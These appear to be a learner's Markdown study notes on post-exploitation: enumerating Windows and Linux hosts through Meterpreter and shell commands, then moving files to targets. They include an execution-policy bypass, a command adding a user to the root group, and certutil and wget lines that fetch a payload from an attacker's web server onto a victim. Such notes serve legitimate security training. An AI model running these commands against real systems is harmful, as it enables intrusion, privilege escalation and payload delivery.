# Post-Exploitation Methodology

![[Post-Exploitation Methodology.png]]

# Windows Local Enumeration

###### Enumerating System Information
- What are we looking for?
	- Hostname
	- OS Name (Windows 7, 8 etc)
	- OS Build & Service Pack (Windows 7 SP1 7600)
	- OS Architecture (x64/x86)
	- Installed updates/Hotfixes
- After getting access to system (meterpreter cmds)
	- `getuid`
	- `sysinfo`
	- `shell`  -- give windows / Linux shell
		- `hostname`
		- `systeminfo` -- display all info including hotfixes
		- `wmic qfe get Caption,Description,HotFixID,InstalledOn`
###### Enumerating Users & Groups
- What are we looking for?
	- Current user & privileges
	- Additional user information
	- Other users on the system
	- Groups
	- Members of the built-in administrator group
- After getting access to system (meterpreter cmds)
	- `getuid`
	- `getprivs`
	- `shell`  -- give windows / Linux shell
		- `whoami`
		- `whoami /priv`
		- `query user` - give currently logged on user
		- `net users` -- display all other accounts on the user
		- `net user [user name]` -- give all info about the user
		- `net localgroup` and `net localgroup [group name]` 
- `use post/windows/gather/enum_logged_on_users`
###### Enumerating Network Information
- What are we looking for?
	- Current IP address & network adapter
	- Internal networks
	- TCP/UDP services running and their respective ports
	- Other hosts on the network
	- Routing table
	- Windows Firewall state
- After getting access to system (meterpreter cmds)
	- `shell`  -- give windows / Linux shell
		- `ipconfig` or `ipconfig /all`
		- `route print`
		- `arp -a`
		- `netstat -ano` -- list all open ports
		- `netsh firewall show state` or `netsh advfirewall firewall`
###### Enumerating Processes & Services
- What are we looking for?
	- Running processes & services
	- Scheduled tasks
- After getting access to system (meterpreter cmds)
	-  `ps`
	- `pgrep explorer.exe` -- give pid of explorer.exe
	- `migrate PID` 
- After getting access to system (meterpreter cmds)
	- `shell`  -- give windows / Linux shell
		- `net start` or `wmic service list brief`  -- give list of started services
		- `tasklist /SVC` -- list the process and the services
		- `schtasks /query /fo LIST /v`
###### Automating Windows Local Enumeration
- `post/windows/gather/enum_applications`
- `post/windows/gather/enum_computers` -- enum the other systems that are connected to that network
- `post/windows/gather/enum_patches`
- [JAWS](https://github.com/411Hall/JAWS)
	- copy the the script and paste it in your system/lab (ctrl+shif+alt to paste on lab)
	- nav to `C:\Temp`
	- `upload /path/of/file/from/your/sytem` -- meterpreter cmd
	- `powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt`
	- `download JAWS-enum.txt` -- meterpreter cmd

# Linux Local Enumeration
###### Enumerating System Information
- What are we looking for?
	- Hostname
	- Distribution & distribution release version
	- Kernel version & architecture
	- CPU information
	- Disk information & mounted drives
	- Installed packages/software
- After getting access to system (meterpreter cmds)
	- `sysinfo`
	- `shell`  -- give windows / Linux shell`
		- `/bin/bash -i`
		- `cat /etc/issue` or `cat /etc/*release`
		- `uname -a`
		- `lscpu`
		- `free -h` -- if utility is installed it will give ram info
		- `df -h` -- disk info
		- `lsblk | grep sd` or `lsblk`  -- storage device info
		- `dpkg -l` -- for installed pkg
###### Enumerating Users & Groups
- What are we looking for?
	- Current user & privileges
	- Other users on the system
	- Groups
- After getting access to system (meterpreter cmds)
	- `getuid`
	-  `shell`  -- give windows / Linux shell`
		- `/bin/bash -i`
		- `whoami`
		- `groups [account name]`
		- `usermod -aG root bob` -- this will add bob to root group
		- `cat /etc/passwd`
		- `last` -- display last login user (legitimate login authentication)
		- `lastlog` -- to display list of user that have logged into the system
###### Enumerating Network Information
- What are we looking for?
	- Current IP address & network adapter
	- Internal networks
	- TCP/UDP services running and their respective ports
	- Other hosts on the network
- After getting access to system (meterpreter cmds)
	- `ifconfig`
	- `netstat`
	- `route`
	- `arp`
	-  `shell`  -- give windows / Linux shell`
		- `/bin/bash -i`
		- `ifconfig` or `ip a s` or `cat /etc/networks`
		- `hostname` or `cat /etc/hostname`
		- `cat /etc/hosts`
		- `cat /etc/resolv.conf` -- for dns info
		- `arp -a`
###### Enumerating Processes & Cron Jobs
- What are we looking for?
	- Running services
	- Cron Jobs
- After getting access to system (meterpreter cmds)
	- `ps`
	- `shell`  -- give windows / Linux shell`
		- `/bin/bash -i`
		- `ps aux`
		- `top`
		- `crontab -l` or `ls -la /etc/cron*`
###### Automating Linux Local Enumeration
- [LinEnum](https://github.com/rebootuser/LinEnum)
	- copy the the script and paste it in your system/lab (ctrl+shif+alt to paste on lab)
	- nav to `cd /tmp`
	- `upload /path/of/file/from/your/sytem` -- meterpreter cmd
	- `shell` then `/bin/bash -i`
	- `chmod +x LinEnum.sh` 
	- `./LinEnum.sh`

# Transferring Files
###### Setting Up A Web Server With Python
- Python comes with a built-in module known as SimpleHTTPServer(python2) and http.server (python3)
	- `python2 -m SimpleHTTPServer 80`
	- `python3 -m http.server 80`
###### Transferring Files To Windows Targets
- `python -m SimpleHTTPServer 80` -- on your machine
- `certutil -urlcache -f http://[Your IP]/payload.exe payload.exe` -- on attacker/victim machine
###### Transferring Files To Linux Targets
- `tmux` -- for multi terminal ]
	- `ctrl+B C` for new terminal
	- `ctrl+B [bash no 0 or 1 or 2 and so on]` - to switch between termianl
	- `exit` -- to close the terminal
- `python3 -m http.server 80`
- `wget htptp://[Your IP]/payload`